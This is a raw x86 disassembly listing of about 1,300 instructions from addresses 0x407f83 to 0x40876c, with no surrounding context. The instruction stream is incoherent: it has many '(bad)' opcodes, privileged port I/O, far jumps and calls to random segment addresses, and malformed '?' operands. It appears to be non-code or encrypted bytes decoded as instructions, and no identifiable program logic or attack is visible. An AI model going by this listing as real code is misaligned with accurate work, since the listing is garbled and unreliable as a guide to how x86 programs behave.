  407f83:	adc    ch,BYTE PTR [esi-0x64]
  407f86:	adc    dh,BYTE PTR [edi]
  407f88:	add    dl,BYTE PTR [edx-0x1c]
  407f8b:	mov    WORD PTR [esp+edi*1],ss
  407f8e:	add    al,0xd
  407f90:	xor    ecx,eax
  407f92:	inc    ecx
  407f93:	fsubr  QWORD PTR [edx-0x2d]
  407f96:	ret    
  407f97:	push   eax
  407f98:	mov    ah,0xb8
  407f9a:	push   edx
  407f9b:	mov    cs,WORD PTR [eax+0x5e3ede56]
  407fa1:	in     al,dx
  407fa2:	sbb    esp,eax
  407fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fa5:	jg     0x407f41
  407fa7:	(bad)  
  407fa9:	xchg   edx,eax
  407faa:	mov    bh,0xc0
  407fac:	mov    bh,0xb6
  407fae:	sub    ch,BYTE PTR [ecx+0x69223735]
  407fb4:	stos   BYTE PTR es:[edi],al
  407fb5:	mov    al,0x13
  407fb7:	popa   
  407fb8:	inc    eax
  407fb9:	or     dl,cl
  407fbb:	ja     0x407ffc
  407fbd:	scas   eax,DWORD PTR es:[edi]
  407fbe:	dec    esp
  407fbf:	jmp    0xdcd3:0x843322ff
  407fc6:	adc    al,0xa6
  407fc8:	(bad)  
  407fc9:	cvtpi2ps xmm0,mm4
  407fcc:	mov    eax,ds:0x6fce0d79
  407fd1:	add    DWORD PTR [ebx],esp
  407fd3:	jb     0x407fb0
  407fd5:	daa    
  407fd6:	push   ebp
  407fd7:	or     esp,DWORD PTR [ecx+edi*1+0x1073eee8]
  407fde:	xor    BYTE PTR [eax+0x40453be7],0x71
  407fe5:	sar    BYTE PTR [edx],cl
  407fe7:	nop
  407fe8:	inc    esp
  407fe9:	fsubr  QWORD PTR [esi-0x5689ae6c]
  407fef:	mov    ecx,0x60c2dc69
  407ff4:	push   ecx
  407ff5:	(bad)
  407ff8:	lock cmp ch,BYTE PTR [eax]
  407ffb:	fidivr WORD PTR [ecx+0x25]
  407ffe:	dec    ebx
  407fff:	and    ch,BYTE PTR [edi-0x80]
  408002:	in     al,dx
  408003:	mov    esi,0x817ff9d
  408008:	sub    al,0xb4
  40800a:	xor    BYTE PTR [ecx],bh
  40800c:	in     al,dx
  40800d:	mov    dl,0xe8
  40800f:	lock gs ret 
  408012:	shr    DWORD PTR [ecx+0x3f],1
  408015:	xchg   esi,eax
  408016:	push   eax
  408017:	adc    cl,BYTE PTR ds:0x1e8055da
  40801d:	ins    BYTE PTR es:[edi],dx
  40801e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40801f:	adc    eax,0x8e54cd9c
  408024:	sbb    eax,0x41c47621
  408029:	in     al,dx
  40802a:	cmp    ebx,edx
  40802c:	mov    esi,0xb31380ec
  408031:	push   eax
  408032:	loope  0x40802d
  408034:	(bad)  [ebx+0x69]
  408037:	outs   dx,DWORD PTR ds:[esi]
  408038:	add    bl,ch
  40803a:	mov    DWORD PTR [edx-0x51],eax
  40803d:	push   ss
  40803e:	sub    al,0x7b
  408040:	jbe    0x408012
  408042:	rol    BYTE PTR [edx+ebp*2-0x1ce280d3],1
  408049:	sbb    al,0x2f
  40804b:	sub    DWORD PTR [eax],0x9b4c1e17
  408051:	popf   
  408052:	fidivr WORD PTR [edi+ebx*8+0x5c]
  408056:	es into 
  408058:	dec    esp
  408059:	mov    eax,ds:0xaee9467a
  40805e:	fadd   DWORD PTR [eax]
  408060:	pop    es
  408061:	sbb    eax,0x277cc27d
  408066:	out    dx,eax
  408067:	out    0xad,al
  408069:	rcl    BYTE PTR [edi-0x1f],1
  40806c:	and    BYTE PTR [edi+0x20],bl
  40806f:	loope  0x4080a6
  408071:	repnz sub eax,0x1a795a2
  408077:	fwait
  408078:	arpl   bp,si
  40807a:	dec    ecx
  40807b:	jns    0x408084
  40807d:	dec    eax
  40807e:	outs   dx,DWORD PTR ds:[esi]
  40807f:	not    DWORD PTR [edi+edx*4+0x34]
  408083:	add    DWORD PTR [ecx+esi*4],ebx
  408086:	cmp    bl,BYTE PTR [edx-0x2cd1f163]
  40808c:	cli    
  40808d:	stc    
  40808e:	test   ebp,ebp
  408090:	mov    bl,0x2e
  408092:	inc    eax
  408093:	cmc    
  408094:	and    ebp,edi
  408096:	pusha  
  408097:	sbb    ah,BYTE PTR [eax-0x66fc077d]
  40809d:	push   ss
  40809e:	cmp    eax,0x92a3c9cb
  4080a3:	vmwrite ebx,DWORD PTR [edi+0x2e]
  4080a7:	leave  
  4080a8:	mov    eax,ds:0xbdfe4805
  4080ad:	mov    al,BYTE PTR [edi+0x1a04d29d]
  4080b3:	push   ds
  4080b4:	inc    edi
  4080b5:	clc    
  4080b6:	jae    0x4080bf
  4080b8:	test   BYTE PTR [esi],ah
  4080ba:	fisttp WORD PTR gs:[ebp+0x2b]
  4080be:	(bad)  
  4080bf:	adc    al,0x70
  4080c1:	fsub   QWORD PTR [edx+0x51]
  4080c4:	cmp    BYTE PTR [edx+0x40ee99ae],bl
  4080ca:	jle    0x408145
  4080cc:	cdq    
  4080cd:	dec    esi
  4080ce:	retf   
  4080cf:	adc    ah,BYTE PTR [ecx]
  4080d1:	ja     0x408113
  4080d3:	fcom   DWORD PTR [esi]
  4080d5:	mov    dh,0xe8
  4080d7:	sbb    eax,0x55d8fb20
  4080dc:	retf   
  4080dd:	sub    esi,ebp
  4080df:	daa    
  4080e0:	iret   
  4080e1:	loopne 0x408105
  4080e3:	ds dec ebp
  4080e5:	dec    ecx
  4080e6:	ins    DWORD PTR es:[edi],dx
  4080e7:	cmp    BYTE PTR [ecx-0x1960fa06],ah
  4080ed:	nop
  4080ee:	pop    edx
  4080ef:	and    al,0xfd
  4080f1:	inc    esi
  4080f2:	daa    
  4080f3:	sbb    eax,0x50ed0026
  4080f8:	pop    esi
  4080f9:	aad    0xee
  4080fb:	and    BYTE PTR [edx],bl
  4080fd:	mov    ebp,0x755d8865
  408102:	jmp    0x375df24f
  408107:	push   0x5fe87699
  40810c:	fdivr  st,st(5)
  40810e:	jo     0x40809a
  408110:	mov    ebp,0x94b36b9b
  408115:	leave  
  408116:	and    ah,BYTE PTR [eax]
  408118:	push   ebp
  408119:	std    
  40811a:	ds repz std 
  40811d:	and    bl,BYTE PTR [ecx]
  40811f:	jp     0x4080b1
  408121:	mov    ah,0x4c
  408123:	(bad)  
  408124:	cwde   
  408125:	test   DWORD PTR [eax],eax
  408127:	add    esp,ecx
  408129:	cdq    
  40812a:	or     al,BYTE PTR [edx+ebx*4+0x6b]
  40812e:	xchg   edx,eax
  40812f:	in     al,dx
  408130:	push   esp
  408131:	int3   
  408132:	push   cs
  408133:	pop    ss
  408134:	adc    DWORD PTR [ebp-0x1236582b],edi
  40813a:	and    BYTE PTR [edi],al
  40813c:	push   eax
  40813d:	adc    DWORD PTR [eax+ebp*1],ecx
  408140:	jle    0x40814f
  408142:	jne    0x4080d7
  408144:	push   edx
  408145:	mov    ebx,0x1a02025c
  40814a:	jno    0x4080d2
  40814c:	dec    ebx
  40814d:	push   eax
  40814e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40814f:	mov    ds:0xda48eb32,eax
  408154:	call   0x83e0:0x8172f7a1
  40815b:	push   ebx
  40815c:	iret   
  40815d:	sahf   
  40815e:	call   0xe5cb0370
  408163:	mov    dh,0x6a
  408165:	loopne 0x4080ff
  408167:	scas   al,BYTE PTR es:[edi]
  408168:	push   0x64e7cc83
  40816d:	std    
  40816e:	arpl   WORD PTR [ebp+0x758c941c],di
  408174:	ins    DWORD PTR es:[edi],dx
  408175:	pop    ds
  408176:	arpl   WORD PTR [ebx-0x14],ax
  408179:	fldenv [eax+0x1a]
  40817c:	hlt    
  40817d:	icebp  
  40817e:	push   esi
  40817f:	add    eax,0xa502bc42
  408184:	std    
  408185:	mov    ebp,0x3284ac0a
  40818a:	or     eax,ecx
  40818c:	rcl    DWORD PTR [ebx-0x60ccf32f],1
  408192:	in     al,0x4f
  408194:	inc    edi
  408195:	add    dl,BYTE PTR [si-0x7f5]
  40819a:	xor    DWORD PTR [ebx-0x7e10cd30],ecx
  4081a0:	and    al,0x82
  4081a2:	dec    esi
  4081a3:	and    dl,cl
  4081a5:	and    ebp,DWORD PTR ds:0x5236a0ff
  4081ab:	jp     0x4081a8
  4081ad:	jecxz  0x40817b
  4081af:	sub    esp,edi
  4081b1:	jb     0x4081e9
  4081b3:	xchg   BYTE PTR [edx+0x1dafad27],bh
  4081b9:	and    al,0x31
  4081bb:	xor    DWORD PTR [ebx+eiz*1-0x74],0x29567ac6
  4081c3:	push   cs
  4081c4:	push   ss
  4081c5:	imul   ecx,eax,0x25
  4081c8:	mov    al,0x18
  4081ca:	mov    ebx,0x6953d0a8
  4081cf:	mov    eax,ds:0xd95593c4
  4081d4:	mov    cl,0x6e
  4081d6:	sbb    edx,0x7ee4f28f
  4081dc:	out    0xe2,al
  4081de:	xor    eax,DWORD PTR [edi]
  4081e0:	aas    
  4081e1:	sub    eax,0x74fd6a5b
  4081e6:	imul   ebp,DWORD PTR [eax+0x33ee0bfd],0xffffffcc
  4081ed:	rcl    BYTE PTR [ebp+edx*4-0x3e],1
  4081f1:	xlat   BYTE PTR ds:[ebx]
  4081f2:	ss add al,0x7b
  4081f5:	in     eax,0xaf
  4081f7:	leave  
  4081f8:	nop
  4081f9:	add    al,0x7d
  4081fb:	sub    ah,BYTE PTR [edx-0x408a6eca]
  408201:	xchg   BYTE PTR [edi],cl
  408203:	pop    ebp
  408204:	mov    edi,0x974f1625
  408209:	sub    eax,0x254193c7
  40820e:	cmp    eax,0xb6828610
  408213:	pop    ds
  408214:	mov    ecx,0x217d782
  408219:	xlat   BYTE PTR ds:[ebx]
  40821a:	int3   
  40821b:	ja     0x40825d
  40821d:	gs mov ah,0xb4
  408220:	mov    bh,0x53
  408222:	adc    al,BYTE PTR [edx]
  408224:	or     ebp,DWORD PTR ss:[ecx-0x57d8c495]
  40822b:	es enter 0x2111,0x12
  408230:	loope  0x4081f7
  408232:	aam    0x32
  408234:	jmp    0x40829f
  408236:	sbb    dl,cl
  408238:	jns    0x40823a
  40823a:	mov    ah,0x84
  40823c:	sub    cl,BYTE PTR [edx+0x2b]
  40823f:	fist   DWORD PTR [ecx-0x41]
  408242:	sub    DWORD PTR [eax],edx
  408244:	aad    0x9e
  408246:	push   edi
  408247:	je     0x4081db
  408249:	aad    0x5
  40824b:	dec    eax
  40824c:	mov    ss,WORD PTR [ebx-0x1b5b6709]
  408252:	cmp    eax,ebx
  408254:	mov    ?,WORD PTR [edi]
  408256:	test   eax,0xa2d349a0
  40825c:	rcl    BYTE PTR [edi-0x7f],cl
  40825f:	repz loope 0x40823c
  408262:	push   ss
  408263:	test   ecx,0x8cb928b1
  408269:	imul   esi,DWORD PTR [edx],0x3c
  40826c:	stc    
  40826d:	push   ebx
  40826e:	jae    0x408262
  408270:	pushf  
  408271:	icebp  
  408272:	and    DWORD PTR [edx-0x3e],edi
  408275:	je     0x408250
  408277:	jecxz  0x40822c
  408279:	cwde   
  40827a:	lock inc ecx
  40827c:	ficomp DWORD PTR [ebx]
  40827e:	jmp    0x4245:0x89f91698
  408285:	sub    eax,0x99d3f4d0
  40828a:	xchg   esp,eax
  40828b:	nop
  40828c:	jmp    0xab29440
  408291:	mov    dh,0x1a
  408293:	fild   QWORD PTR [edi-0x35]
  408296:	sbb    edx,DWORD PTR ds:0x5759b7bf
  40829c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40829d:	repnz cmc 
  40829f:	sbb    edx,esi
  4082a1:	mov    esi,0xd71658b0
  4082a6:	add    BYTE PTR ds:0x5a950e9e,0x85
  4082ad:	and    eax,0xc1b5683b
  4082b2:	add    ebp,edx
  4082b4:	out    0x92,al
  4082b6:	or     eax,0x2b757352
  4082bb:	inc    ecx
  4082bc:	pop    esp
  4082bd:	out    dx,eax
  4082be:	and    BYTE PTR [esi],cl
  4082c0:	push   ss
  4082c1:	mov    cl,0xe5
  4082c3:	mov    cl,0xd1
  4082c5:	mov    esp,0xd210e01c
  4082ca:	jae    0x40824e
  4082cc:	ss mov ebp,0xcb0dcbeb
  4082d2:	or     eax,DWORD PTR [ebx]
  4082d4:	imul   edx,ebx,0x7a8b94a8
  4082da:	xchg   ecx,eax
  4082db:	push   ebp
  4082dc:	xchg   ebx,eax
  4082dd:	sbb    al,0xfc
  4082df:	inc    ebp
  4082e0:	xor    esp,DWORD PTR gs:[esi-0x63c9eec5]
  4082e7:	dec    ecx
  4082e8:	inc    eax
  4082e9:	rcl    DWORD PTR [edi-0x58],cl
  4082ec:	(bad)  
  4082ed:	out    dx,al
  4082ee:	adc    ch,BYTE PTR [eax]
  4082f0:	xchg   edx,eax
  4082f1:	(bad)  
  4082f2:	push   edx
  4082f3:	lock add al,0x60
  4082f6:	inc    ebp
  4082f7:	adc    ecx,esp
  4082f9:	rcl    DWORD PTR [esi+0x5a3f614d],cl
  4082ff:	sbb    BYTE PTR ds:0xff923d2b,dl
  408305:	xchg   esp,ebp
  408307:	jb     0x408385
  408309:	imul   ebx,esp,0xd33736f6
  40830f:	mov    edx,0x9e208c99
  408314:	mov    ecx,0xdd631e1b
  408319:	sbb    BYTE PTR [esi+0x3cec38d5],dl
  40831f:	push   0xc94fb904
  408324:	pop    eax
  408325:	or     ah,BYTE PTR [ebx-0x57c9e0a1]
  40832b:	ror    DWORD PTR [edi],cl
  40832d:	test   BYTE PTR [edi+0x14],dl
  408330:	add    BYTE PTR [eax],al
  408332:	lea    eax,[ebp-0x98]
  408338:	push   eax
  408339:	mov    eax,DWORD PTR [ebp-0x1c]
  40833c:	xor    eax,esi
  40833e:	add    eax,edi
  408340:	push   eax
  408341:	jmp    0x40884c
  408346:	aas    
  408347:	int    0x3c
  408349:	(bad)  
  40834a:	rcr    cl,cl
  40834c:	retf   
  40834d:	aad    0xf3
  40834f:	(bad)  
  408350:	inc    edi
  408351:	sbb    DWORD PTR [edx+ebx*4-0x1c],ecx
  408355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408356:	in     al,dx
  408357:	in     al,0x78
  408359:	js     0x4083c5
  40835b:	jl     0x4083d5
  40835d:	js     0x408374
  40835f:	jecxz  0x40831f
  408361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408362:	(bad)  
  408363:	and    BYTE PTR [edx-0x6b6ecd4d],al
  408369:	mov    ch,0x6a
  40836b:	test   DWORD PTR [edi+0x277e1477],eax
  408371:	imul   eax,DWORD PTR [edx+0x48bce816],0xa337a8e7
  40837b:	dec    edx
  40837c:	cs icebp 
  40837e:	into   
  40837f:	sub    ch,0x42
  408382:	retf   
  408383:	lds    ecx,FWORD PTR [esi]
  408385:	cmp    al,0xa4
  408387:	in     al,dx
  408388:	out    dx,eax
  408389:	or     DWORD PTR [ebp+0x48],esi
  40838c:	outs   dx,BYTE PTR ds:[esi]
  40838d:	cli    
  40838e:	call   0x80fc:0xf37406b6
  408395:	leave  
  408396:	xlat   BYTE PTR ds:[ebx]
  408397:	inc    ebx
  408398:	and    ch,BYTE PTR [esi]
  40839a:	aam    0xe3
  40839c:	mov    cl,0xca
  40839e:	cli    
  40839f:	fs pop ebx
  4083a1:	and    DWORD PTR [eax+ebp*1],ebp
  4083a4:	mov    ds:0x3fa2d8cc,eax
  4083a9:	pop    ebx
  4083aa:	xor    ah,BYTE PTR [edx]
  4083ac:	adc    ebx,esi
  4083ae:	std    
  4083af:	aam    0x64
  4083b1:	inc    ebx
  4083b2:	mov    esi,0xd1bb27bc
  4083b7:	stos   BYTE PTR es:[edi],al
  4083b8:	or     dh,ah
  4083ba:	les    eax,FWORD PTR [edi]
  4083bc:	mov    al,ds:0xe437026
  4083c1:	jg     0x408401
  4083c3:	push   esp
  4083c4:	daa    
  4083c5:	and    DWORD PTR [ecx+0x792067e8],0xffffffe3
  4083cc:	daa    
  4083cd:	sbb    eax,0x72cb4f08
  4083d2:	ror    BYTE PTR [ebp+0x5410843d],0x3a
  4083d9:	push   ebx
  4083da:	jl     0x4083f2
  4083dc:	jmp    0x408389
  4083de:	int    0x6c
  4083e0:	mov    ds:0x66e70c40,al
  4083e5:	pop    ebx
  4083e6:	sub    eax,0x9f05467e
  4083eb:	mov    ?,ebx
  4083ed:	add    cl,BYTE PTR [eax-0x4a6c434f]
  4083f3:	or     dh,BYTE PTR [edx]
  4083f5:	rcl    BYTE PTR [ebp-0x41],0x7f
  4083f9:	cwde   
  4083fa:	sar    DWORD PTR [edx],cl
  4083fc:	xlat   BYTE PTR ds:[ebx]
  4083fd:	mov    ds:0xab9f60ff,eax
  408402:	int3   
  408403:	push   0xec4b5435
  408408:	inc    ebx
  408409:	hlt    
  40840a:	fsubr  DWORD PTR [edx]
  40840c:	(bad)  
  40840e:	aad    0x1a
  408410:	pop    DWORD PTR [ebp-0x55]
  408413:	and    al,0xa3
  408415:	cli    
  408416:	jge    0x40846b
  408418:	rcr    DWORD PTR [ebx-0x11],0x8c
  40841c:	jg     0x4083be
  40841e:	push   cs
  40841f:	dec    eax
  408420:	les    esi,FWORD PTR [edx]
  408422:	push   ecx
  408423:	sbb    dh,BYTE PTR [esi-0x69]
  408426:	ret    0x4569
  408429:	outs   dx,DWORD PTR ds:[esi]
  40842a:	xchg   ebp,eax
  40842b:	scas   eax,DWORD PTR es:[edi]
  40842c:	les    esi,FWORD PTR [ebx]
  40842e:	add    esp,DWORD PTR [ebx]
  408430:	gs scas eax,DWORD PTR es:[edi]
  408432:	ret    
  408433:	jecxz  0x408489
  408435:	call   FWORD PTR [esi+eiz*8-0x49]
  408439:	stc    
  40843a:	scas   al,BYTE PTR es:[edi]
  40843b:	jns    0x4084ab
  40843d:	xor    DWORD PTR [eax],edx
  40843f:	dec    eax
  408440:	retf   0x2c0c
  408443:	div    dl
  408445:	dec    esi
  408446:	xor    eax,0x4d15b4c3
  40844b:	pushf  
  40844c:	sbb    ah,BYTE PTR [ebx-0x1d]
  40844f:	lea    esp,[edx-0x38bd6432]
  408455:	pop    ds
  408456:	dec    esp
  408457:	xchg   edx,eax
  408458:	xor    al,dl
  40845a:	stos   BYTE PTR es:[edi],al
  40845b:	bound  edx,QWORD PTR [ecx+0x29]
  40845e:	fisubr DWORD PTR [esi-0x860148c]
  408464:	push   ebp
  408465:	sbb    eax,0x476a7d8d
  40846a:	inc    esp
  40846b:	leave  
  40846c:	scas   al,BYTE PTR es:[edi]
  40846d:	push   ss
  40846e:	mov    esi,0x4d11db2f
  408473:	inc    esi
  408474:	push   ebx
  408475:	scas   al,BYTE PTR es:[edi]
  408476:	sub    eax,0xb300ca0b
  40847b:	les    ebp,FWORD PTR [esi-0x65]
  40847e:	mov    ch,0xbb
  408480:	sbb    edx,DWORD PTR [eax-0x12]
  408483:	push   esi
  408484:	sub    esi,DWORD PTR [esi+0x17b9d5b6]
  40848a:	mov    dh,0x15
  40848c:	xchg   ebp,eax
  40848d:	mov    ch,al
  40848f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408490:	jno    0x408465
  408492:	loop   0x4084d6
  408494:	(bad)  
  408495:	iret   
  408496:	or     DWORD PTR [ecx-0x28f6abc],edx
  40849c:	adc    BYTE PTR [edi-0x4e],0x86
  4084a0:	dec    esp
  4084a1:	inc    ebp
  4084a2:	jmp    0x408454
  4084a4:	sub    ebx,DWORD PTR [edi]
  4084a6:	sub    DWORD PTR [esi],ebp
  4084a8:	mov    bh,0xcf
  4084aa:	and    DWORD PTR [edx],esi
  4084ac:	xchg   edx,eax
  4084ad:	cdq    
  4084ae:	xchg   BYTE PTR [ebp+0x74f64239],ah
  4084b4:	sub    BYTE PTR [edi],al
  4084b6:	out    dx,al
  4084b7:	push   cs
  4084b8:	inc    esp
  4084b9:	mov    esp,0xed4e1445
  4084be:	push   es
  4084bf:	loopne 0x4084b5
  4084c1:	inc    ebx
  4084c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084c3:	test   BYTE PTR ds:0xd2f9e3df,ah
  4084c9:	and    al,0x7d
  4084cb:	test   BYTE PTR [ebx+0x4e08d248],ch
  4084d1:	xor    esi,DWORD PTR [ebx+0x42]
  4084d4:	mov    edx,edi
  4084d6:	imul   esp,DWORD PTR [esi+0x32e9fa19],0xffffff9e
  4084dd:	cdq    
  4084de:	mov    DWORD PTR [ebp-0x1b66c942],eax
  4084e4:	iret   
  4084e5:	add    DWORD PTR [ebx-0x74],ebp
  4084e8:	jmp    0x3ecdd94
  4084ed:	inc    eax
  4084ee:	mov    cl,0x68
  4084f0:	xlat   BYTE PTR ds:[ebx]
  4084f1:	cli    
  4084f2:	cs sbb eax,0x8cd7fb92
  4084f8:	(bad)  
  4084f9:	test   eax,0x512ff07a
  4084fe:	(bad)
  408501:	pop    eax
  408502:	in     eax,dx
  408503:	aaa    
  408504:	repnz loope 0x408490
  408507:	sti    
  408508:	test   al,0xa7
  40850a:	mov    gs,WORD PTR [ecx-0x73ccfd8a]
  408510:	and    BYTE PTR ds:0x49adf5ac,ah
  408516:	sahf   
  408517:	(bad)  
  408518:	(bad)  [edi+0x29d20251]
  40851e:	inc    ebx
  40851f:	jmp    0x4084a1
  408521:	or     eax,0xec522824
  408526:	fmul   st(2),st
  408528:	or     BYTE PTR [ecx],bh
  40852a:	retf   0x21c
  40852d:	retf   
  40852e:	pushf  
  40852f:	and    al,0x79
  408531:	loope  0x408531
  408533:	fimul  DWORD PTR [esi]
  408535:	and    DWORD PTR [ebx-0x3818143c],edx
  40853b:	dec    ecx
  40853c:	fidivr WORD PTR [edi-0x5f7e5161]
  408542:	or     ecx,DWORD PTR [ebx]
  408544:	pop    ss
  408545:	mov    DWORD PTR [ebp+0x14],eax
  408548:	mov    BYTE PTR [ebp+edi*8-0x5],dl
  40854c:	add    al,0xe1
  40854e:	fisub  DWORD PTR [ecx+0x44b7961d]
  408554:	jae    0x408510
  408556:	xchg   ebp,eax
  408557:	cmp    ah,bl
  408559:	in     eax,0x89
  40855b:	cmp    DWORD PTR [edx+0x67],eax
  40855e:	pop    ds
  40855f:	mov    ch,0xd7
  408561:	mov    ah,0xde
  408563:	dec    ebx
  408564:	pop    ebp
  408565:	push   cs
  408566:	mul    BYTE PTR [ecx+0x7a]
  408569:	pop    edi
  40856a:	xor    BYTE PTR [eax+0x4a791362],ch
  408570:	push   cs
  408571:	shr    DWORD PTR [edi-0x3f],1
  408574:	mov    ch,BYTE PTR [edi+0x2f]
  408577:	aas    
  408578:	push   edi
  408579:	lds    ebp,FWORD PTR [edx]
  40857b:	ret    0xbaa3
  40857e:	mov    ebp,0x8abb4cd4
  408583:	push   es
  408584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408585:	cmp    ch,ah
  408587:	xlat   BYTE PTR ds:[ebx]
  408588:	push   ss
  408589:	sbb    eax,0x834de7ed
  40858e:	(bad)  
  40858f:	retf   
  408590:	aad    0x33
  408592:	fcom   DWORD PTR [ebp-0x1b]
  408595:	xlat   BYTE PTR ds:[ebx]
  408596:	mov    ecx,0x6578474d
  40859b:	call   0x43ca:0xa6e09098
  4085a2:	pop    edx
  4085a3:	push   es
  4085a4:	retf   
  4085a5:	xchg   esi,eax
  4085a6:	dec    ebp
  4085a7:	or     DWORD PTR [ebp+ecx*4+0x39642a28],esp
  4085ae:	sub    eax,DWORD PTR [ecx-0x19fe326b]
  4085b4:	cmp    DWORD PTR [edi+ecx*1-0x39],ebx
  4085b8:	mov    esp,0xa07551e0
  4085bd:	fcmovnb st,st(4)
  4085bf:	std    
  4085c0:	stc    
  4085c1:	xchg   esp,eax
  4085c2:	or     dh,ch
  4085c4:	popa   
  4085c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c7:	push   ds
  4085c8:	stos   BYTE PTR es:[edi],al
  4085c9:	test   al,0x1f
  4085cb:	in     al,dx
  4085cc:	out    0xe,al
  4085ce:	aaa    
  4085cf:	call   0x992ee0e
  4085d4:	mov    cl,0x84
  4085d6:	mov    WORD PTR [ebx-0x22143df1],ds
  4085dc:	stc    
  4085dd:	mov    al,ds:0x629d9ac0
  4085e2:	pop    edx
  4085e3:	and    al,0xaa
  4085e5:	and    eax,DWORD PTR [ebp-0x7b]
  4085e8:	scas   al,BYTE PTR es:[edi]
  4085e9:	mov    ebp,es
  4085eb:	fisubr WORD PTR [esi+esi*8-0x5ebf8f8f]
  4085f2:	sbb    al,0x73
  4085f4:	fcom   QWORD PTR [ebp-0x3b4fda76]
  4085fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085fb:	shl    BYTE PTR [esi+0x396d50ea],1
  408601:	sub    BYTE PTR [edi-0x56],ch
  408604:	fisttp QWORD PTR [esi+0xa]
  408607:	mov    edi,0x56a203d1
  40860c:	sub    al,0x46
  40860e:	dec    esi
  40860f:	test   eax,0xade63e34
  408614:	pop    es
  408615:	mov    ebx,0x94ee6963
  40861a:	addr16 leave 
  40861c:	pop    eax
  40861d:	cld    
  40861e:	(bad)
  408621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408622:	xor    ecx,DWORD PTR [ebx+esi*1+0x7d]
  408626:	or     eax,0xc8adb4e9
  40862b:	outs   dx,DWORD PTR ds:[esi]
  40862c:	pushf  
  40862d:	mov    dh,dl
  40862f:	sub    DWORD PTR [esp+edi*1],0x22
  408633:	enter  0x33b,0x7f
  408637:	add    eax,0xdcd162de
  40863c:	push   esi
  40863d:	fld    DWORD PTR [edi+0x1a3d5fa0]
  408643:	xor    eax,0xb6236277
  408648:	(bad)  
  408649:	cmp    eax,0xbbecd612
  40864e:	pop    ebp
  40864f:	test   esp,0xaf2e7959
  408655:	into   
  408656:	jle    0x4086b6
  408658:	arpl   WORD PTR [ebp-0x6e],di
  40865b:	pop    ebx
  40865c:	add    DWORD PTR [eax],0x1c
  40865f:	retf   0xcfa0
  408662:	mov    cl,0xc9
  408664:	aam    0x67
  408666:	mov    ebx,DWORD PTR [ebx+0x71]
  408669:	ins    DWORD PTR es:[edi],dx
  40866a:	pop    edi
  40866b:	stos   BYTE PTR es:[edi],al
  40866c:	inc    esi
  40866d:	js     0x4086e7
  40866f:	test   al,0x9d
  408671:	mov    ds:0xbcfec690,al
  408676:	mov    ch,0xc0
  408678:	mov    eax,0xb2c9bb06
  40867d:	xchg   esi,eax
  40867e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40867f:	popa   
  408680:	ja     0x4086e2
  408682:	jmp    0x408682
  408684:	xor    eax,DWORD PTR [ebx]
  408686:	add    dl,BYTE PTR [ebx+esi*4+0x2296fb8e]
  40868d:	(bad)  
  40868f:	in     al,0x6
  408691:	das    
  408692:	mov    ah,0x73
  408694:	ficomp WORD PTR ds:0xf95188e3
  40869a:	cmp    eax,0xac8b7da9
  40869f:	imul   edi,ecx,0x72
  4086a2:	call   0xab3a13
  4086a7:	jmp    0x381d:0xaebaee6a
  4086ae:	out    dx,eax
  4086af:	and    esp,0x44
  4086b2:	into   
  4086b3:	icebp  
  4086b4:	fldcw  WORD PTR [ebx+0x14b3ddde]
  4086ba:	rcl    DWORD PTR [edi],1
  4086bc:	sahf   
  4086bd:	lods   al,BYTE PTR ds:[esi]
  4086be:	pop    DWORD PTR [edx+0x4e0f907c]
  4086c4:	test   eax,0x56a59fc3
  4086c9:	aas    
  4086ca:	test   al,0xc4
  4086cc:	and    DWORD PTR [ebp+0x54004387],ebx
  4086d2:	pop    esp
  4086d3:	cmp    dl,BYTE PTR [edi-0x3dbb9b41]
  4086d9:	aam    0xd3
  4086db:	inc    eax
  4086dc:	jle    0x40871c
  4086de:	push   ebp
  4086df:	and    al,0xd3
  4086e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086e2:	bound  ebx,QWORD PTR [eax]
  4086e4:	loop   0x4086e2
  4086e6:	pop    eax
  4086e7:	in     eax,0x8d
  4086e9:	lods   al,BYTE PTR ds:[esi]
  4086ea:	cmp    al,0xca
  4086ec:	mov    ch,0x7b
  4086ee:	int    0x23
  4086f0:	out    0xf5,eax
  4086f2:	ret    
  4086f3:	push   es
  4086f4:	xchg   ecx,eax
  4086f5:	repz test al,0xd9
  4086f8:	inc    ecx
  4086f9:	call   DWORD PTR [edi]
  4086fb:	mov    ds:0x9ac26e3b,eax
  408700:	loopne 0x40871a
  408702:	sbb    edx,DWORD PTR ds:0x47177c8c
  408708:	test   BYTE PTR [ebp+0x8eb53b2],0x1f
  40870f:	std    
  408710:	sbb    eax,DWORD PTR ds:0x62743591
  408716:	pop    edx
  408717:	push   es
  408718:	sbb    al,0xb3
  40871a:	mov    bh,0xcc
  40871c:	push   esi
  40871d:	add    eax,0x66a3b7e
  408722:	outs   dx,DWORD PTR ds:[esi]
  408723:	mov    eax,ds:0xb3bea9ad
  408728:	xchg   esi,eax
  408729:	jmp    0x4086e2
  40872b:	sbb    BYTE PTR [edx-0x7e],0xf6
  40872f:	adc    DWORD PTR ds:0x3221f5bb,ebx
  408735:	mov    cl,0xbd
  408737:	fadd   DWORD PTR [edi-0x5e]
  40873a:	and    eax,0x9b16dc7e
  40873f:	push   esp
  408740:	sbb    eax,0x423fe3f7
  408745:	mov    ch,BYTE PTR [eax+0x39dff528]
  40874b:	inc    esp
  40874c:	push   ecx
  40874d:	ds mov cs,esp
  408750:	push   es
  408751:	test   DWORD PTR [ebx-0x7c43cfdc],0xc0ade95
  40875b:	pop    ebx
  40875c:	add    DWORD PTR es:[esi+eax*4-0x488f6adc],ecx
  408764:	dec    esp
  408765:	sub    ch,BYTE PTR [edx-0x68d4a1]
  40876b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40876c:	aad    0x89
